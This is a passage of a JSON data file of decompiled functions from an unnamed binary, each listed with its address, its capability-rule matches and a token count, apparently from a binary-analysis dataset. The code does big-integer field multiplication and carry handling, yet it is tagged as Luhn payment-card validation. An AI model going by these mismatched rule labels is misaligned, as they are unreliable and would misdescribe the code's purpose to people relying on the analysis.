        "decompiled_code": "\nvoid __cdecl fcn.00409370(uint arg_8h, uint arg_ch)\n\n{\n    uint var_324h;\n    uint var_2d4h;\n    uint var_284h;\n    uint var_234h;\n    uint var_1e4h;\n    uint var_194h;\n    uint var_144h;\n    uint var_f4h;\n    uint var_a4h;\n    uint var_54h;\n    int32_t var_4h;\n    \n    fcn.00407c50(&var_194h, arg_ch);\n    fcn.00407c50(&var_a4h, &var_194h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    fcn.00406f00(&var_1e4h, &var_54h, arg_ch);\n    fcn.00406f00(&var_324h, &var_1e4h, &var_194h);\n    fcn.00407c50(&var_54h, &var_324h);\n    fcn.00406f00(&var_234h, &var_54h, &var_1e4h);\n    fcn.00407c50(&var_54h, &var_234h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    fcn.00406f00(&var_f4h, &var_54h, &var_234h);\n    fcn.00407c50(&var_54h, &var_f4h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    for (var_4h = 2; var_4h < 10; var_4h = var_4h + 2) {\n        fcn.00407c50(&var_54h, &var_a4h);\n        fcn.00407c50(&var_a4h, &var_54h);\n    }\n    fcn.00406f00(&var_284h, &var_a4h, &var_f4h);\n    fcn.00407c50(&var_54h, &var_284h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    for (var_4h = 2; var_4h < 0x14; var_4h = var_4h + 2) {\n        fcn.00407c50(&var_54h, &var_a4h);\n        fcn.00407c50(&var_a4h, &var_54h);\n    }\n    fcn.00406f00(&var_54h, &var_a4h, &var_284h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    for (var_4h = 2; var_4h < 10; var_4h = var_4h + 2) {\n        fcn.00407c50(&var_a4h, &var_54h);\n        fcn.00407c50(&var_54h, &var_a4h);\n    }\n    fcn.00406f00(&var_144h, &var_54h, &var_f4h);\n    fcn.00407c50(&var_54h, &var_144h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    for (var_4h = 2; var_4h < 0x32; var_4h = var_4h + 2) {\n        fcn.00407c50(&var_54h, &var_a4h);\n        fcn.00407c50(&var_a4h, &var_54h);\n    }\n    fcn.00406f00(&var_2d4h, &var_a4h, &var_144h);\n    fcn.00407c50(&var_a4h, &var_2d4h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    for (var_4h = 2; var_4h < 100; var_4h = var_4h + 2) {\n        fcn.00407c50(&var_a4h, &var_54h);\n        fcn.00407c50(&var_54h, &var_a4h);\n    }\n    fcn.00406f00(&var_a4h, &var_54h, &var_2d4h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    for (var_4h = 2; var_4h < 0x32; var_4h = var_4h + 2) {\n        fcn.00407c50(&var_54h, &var_a4h);\n        fcn.00407c50(&var_a4h, &var_54h);\n    }\n    fcn.00406f00(&var_54h, &var_a4h, &var_144h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    fcn.00407c50(&var_54h, &var_a4h);\n    fcn.00407c50(&var_a4h, &var_54h);\n    fcn.00406f00(arg_8h, &var_a4h, &var_324h);\n    return;\n}\n",
        "token_count": 1376
    },
    "00405140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405140(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    *arg_8h = uVar1;\n    arg_8h[1] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    arg_8h[2] = iVar2 + iVar3;\n    arg_8h[3] = iVar2 + iVar3 >> 0x20;\n    uVar1 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, 2, 0);\n    iVar3 = fcn.00413150(uVar1, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar4 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar2;\n    arg_8h[4] = iVar2;\n    arg_8h[5] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar5 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[6] = iVar2;\n    arg_8h[7] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar4 = fcn.00413150(iVar2 + iVar4, 2, 0);\n    iVar5 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[8] = iVar2;\n    arg_8h[9] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar7 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar2;\n    arg_8h[10] = iVar2;\n    arg_8h[0xb] = iVar2 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar3 = fcn.00413150(iVar2 + iVar3 + iVar4, 2, 0);\n    iVar4 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar6 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar2;\n    arg_8h[0xc] = iVar2;\n    arg_8h[0xd] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar7 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar8 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar9 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar2;\n    arg_8h[0xe] = iVar2;\n    arg_8h[0xf] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar4 = fcn.00413150(iVar2 + iVar4 + iVar5 + iVar6, 2, 0);\n    iVar5 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar7 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar2;\n    arg_8h[0x10] = iVar2;\n    arg_8h[0x11] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar7 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar8 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar9 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar10 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar11 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar2;\n    arg_8h[0x12] = iVar2;\n    arg_8h[0x13] = iVar2 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar3 = fcn.00413150(iVar2 + iVar3 + iVar4 + iVar5 + iVar6, 2, 0);\n    iVar4 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar2;\n    arg_8h[0x14] = iVar2;\n    arg_8h[0x15] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar7 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar8 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar9 = fcn.00413150(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar2;\n    arg_8h[0x16] = iVar2;\n    arg_8h[0x17] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar4 = fcn.00413150(iVar2 + iVar4 + iVar5 + iVar6, 2, 0);\n    iVar5 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[0x18] = iVar2;\n    arg_8h[0x19] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar6 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar7 = fcn.00413150(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar2;\n    arg_8h[0x1a] = iVar2;\n    arg_8h[0x1b] = iVar2 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar3 = fcn.00413150(iVar2 + iVar3 + iVar4, 2, 0);\n    iVar4 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar2;\n    arg_8h[0x1c] = iVar2;\n    arg_8h[0x1d] = iVar2 >> 0x20;\n    iVar3 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar5 = fcn.00413150(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[0x1e] = iVar2;\n    arg_8h[0x1f] = iVar2 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar4 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar3 = fcn.00413150(iVar3 + iVar4, 2, 0);\n    arg_8h[0x20] = iVar2 + iVar3;\n    arg_8h[0x21] = iVar2 + iVar3 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar3 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    arg_8h[0x22] = iVar2 + iVar3;\n    arg_8h[0x23] = iVar2 + iVar3 >> 0x20;\n    uVar1 = fcn.00413150(arg_ch[0x12], arg_ch[0x12] >> 0x1f, 2, 0);\n    uVar1 = fcn.00413150(uVar1, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    arg_8h[0x24] = uVar1;\n    arg_8h[0x25] = uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 6347
    },
    "004065d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065d0(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    \n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[0x10];\n    arg_8h[0x10] = uVar2 + arg_8h[0x10];\n    arg_8h[0x11] = (uVar2 >> 0x20) + arg_8h[0x11] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[0x10];\n    arg_8h[0x10] = uVar2 + arg_8h[0x10];\n    arg_8h[0x11] = (uVar2 >> 0x20) + arg_8h[0x11] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[0x10];\n    arg_8h[0x10] = uVar1 + arg_8h[0x24];\n    arg_8h[0x11] = arg_8h[0x11] + arg_8h[0x25] + CARRY4(uVar1, arg_8h[0x24]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[0xe];\n    arg_8h[0xe] = uVar2 + arg_8h[0xe];\n    arg_8h[0xf] = (uVar2 >> 0x20) + arg_8h[0xf] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[0xe];\n    arg_8h[0xe] = uVar2 + arg_8h[0xe];\n    arg_8h[0xf] = (uVar2 >> 0x20) + arg_8h[0xf] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[0xe];\n    arg_8h[0xe] = uVar1 + arg_8h[0x22];\n    arg_8h[0xf] = arg_8h[0xf] + arg_8h[0x23] + CARRY4(uVar1, arg_8h[0x22]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[0xc];\n    arg_8h[0xc] = uVar2 + arg_8h[0xc];\n    arg_8h[0xd] = (uVar2 >> 0x20) + arg_8h[0xd] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[0xc];\n    arg_8h[0xc] = uVar2 + arg_8h[0xc];\n    arg_8h[0xd] = (uVar2 >> 0x20) + arg_8h[0xd] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[0xc];\n    arg_8h[0xc] = uVar1 + arg_8h[0x20];\n    arg_8h[0xd] = arg_8h[0xd] + arg_8h[0x21] + CARRY4(uVar1, arg_8h[0x20]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[10];\n    arg_8h[10] = uVar2 + arg_8h[10];\n    arg_8h[0xb] = (uVar2 >> 0x20) + arg_8h[0xb] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[10];\n    arg_8h[10] = uVar2 + arg_8h[10];\n    arg_8h[0xb] = (uVar2 >> 0x20) + arg_8h[0xb] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[10];\n    arg_8h[10] = uVar1 + arg_8h[0x1e];\n    arg_8h[0xb] = arg_8h[0xb] + arg_8h[0x1f] + CARRY4(uVar1, arg_8h[0x1e]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[8];\n    arg_8h[8] = uVar2 + arg_8h[8];\n    arg_8h[9] = (uVar2 >> 0x20) + arg_8h[9] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[8];\n    arg_8h[8] = uVar2 + arg_8h[8];\n    arg_8h[9] = (uVar2 >> 0x20) + arg_8h[9] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[8];\n    arg_8h[8] = uVar1 + arg_8h[0x1c];\n    arg_8h[9] = arg_8h[9] + arg_8h[0x1d] + CARRY4(uVar1, arg_8h[0x1c]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[6];\n    arg_8h[6] = uVar2 + arg_8h[6];\n    arg_8h[7] = (uVar2 >> 0x20) + arg_8h[7] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[6];\n    arg_8h[6] = uVar2 + arg_8h[6];\n    arg_8h[7] = (uVar2 >> 0x20) + arg_8h[7] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[6];\n    arg_8h[6] = uVar1 + arg_8h[0x1a];\n    arg_8h[7] = arg_8h[7] + arg_8h[0x1b] + CARRY4(uVar1, arg_8h[0x1a]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[4];\n    arg_8h[4] = uVar2 + arg_8h[4];\n    arg_8h[5] = (uVar2 >> 0x20) + arg_8h[5] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[4];\n    arg_8h[4] = uVar2 + arg_8h[4];\n    arg_8h[5] = (uVar2 >> 0x20) + arg_8h[5] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[4];\n    arg_8h[4] = uVar1 + arg_8h[0x18];\n    arg_8h[5] = arg_8h[5] + arg_8h[0x19] + CARRY4(uVar1, arg_8h[0x18]);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar2 + arg_8h[2];\n    arg_8h[3] = (uVar2 >> 0x20) + arg_8h[3] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar2 + arg_8h[2];\n    arg_8h[3] = (uVar2 >> 0x20) + arg_8h[3] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar1 + arg_8h[0x16];\n    arg_8h[3] = arg_8h[3] + arg_8h[0x17] + CARRY4(uVar1, arg_8h[0x16]);\n    uVar2 = fcn.00413190();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar2 + *arg_8h;\n    arg_8h[1] = (uVar2 >> 0x20) + arg_8h[1] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00413190();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar2 + *arg_8h;\n    arg_8h[1] = (uVar2 >> 0x20) + arg_8h[1] + CARRY4(uVar2, uVar1);\n    uVar1 = *arg_8h;\n    *arg_8h = uVar1 + arg_8h[0x14];\n    arg_8h[1] = arg_8h[1] + arg_8h[0x15] + CARRY4(uVar1, arg_8h[0x14]);\n    return;\n}\n",
        "token_count": 2287
    },
    "00406f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406f60(uint *arg_8h, int32_t *arg_ch)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, *arg_ch, *arg_ch >> 0x1f);\n    *arg_8h = uVar1;\n    arg_8h[1] = uVar1 >> 0x20;\n    uVar1 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, 2, 0);\n    uVar1 = fcn.00413150(uVar1, arg_ch[2], arg_ch[2] >> 0x1f);\n    arg_8h[2] = uVar1;\n    arg_8h[3] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[2], arg_ch[2] >> 0x1f);\n    iVar3 = fcn.00413150(*arg_ch, *arg_ch >> 0x1f, arg_ch[4], arg_ch[4] >> 0x1f);\n    uVar1 = fcn.00413150(iVar2 + iVar3, 2, 0);\n    arg_8h[4] = uVar1;\n    arg_8h[5] = uVar1 >> 0x20;\n    iVar2 = fcn.00413150(arg_ch[2], arg_ch[2] >> 0x1f, 